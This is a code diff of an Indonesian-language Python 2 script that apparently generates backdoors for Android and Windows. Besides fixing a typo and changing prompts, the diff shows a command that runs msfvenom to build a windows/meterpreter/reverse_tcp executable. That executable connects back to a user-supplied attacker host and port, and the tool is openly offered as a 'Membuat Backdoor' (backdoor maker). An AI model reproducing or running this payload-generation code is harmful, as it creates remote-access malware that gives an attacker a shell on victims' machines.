@@ -62,7 +62,7 @@ def help():
     print cyan+'======================================'
     print merah+'List Of Commands :'
     print green+' ~ backdoor/android : Membuat Backdoor Baru untuk android'
-    pirnt green+' ~ backdoor/windows : Membuat Backdoor Baru untuk windows'
+    print green+' ~ backdoor/windows : Membuat Backdoor Baru untuk windows'
     print green+' ~ Eksekusi :MengEksekusi Target'
     print green+' ~ Update : MengUpdate SC'
     print green+' ~ Help : Menunjukkan Bantuan'
@@ -184,7 +184,7 @@ def baru():
 def baru2():
     os.system('clear')
     logo()
-    print merah+"Contoh Nama Aplikasi (Backdoor.apk tanpa .apk)"
+    print merah+"Contoh Nama Aplikasi (Backdoor.Exe tanpa .Exe)"
     name=raw_input("Name : ")
     print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
     print "Contoh Menggunakan Config Saya"
@@ -201,8 +201,7 @@ def baru2():
     os.system('clear')
     print hijau+"[*] Lagi Membuat Backdoor, Mohon Bersabar..."
     os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" R > /sdcard/"+name+".exe")
-    print merah+"Buka Apk-Signer,Lalu "+name+".apk Nya"
-    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
+    print green+"Sukses Membuat Backdoor Dengan Nama "+name+".apk !!!"
     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     home()
 
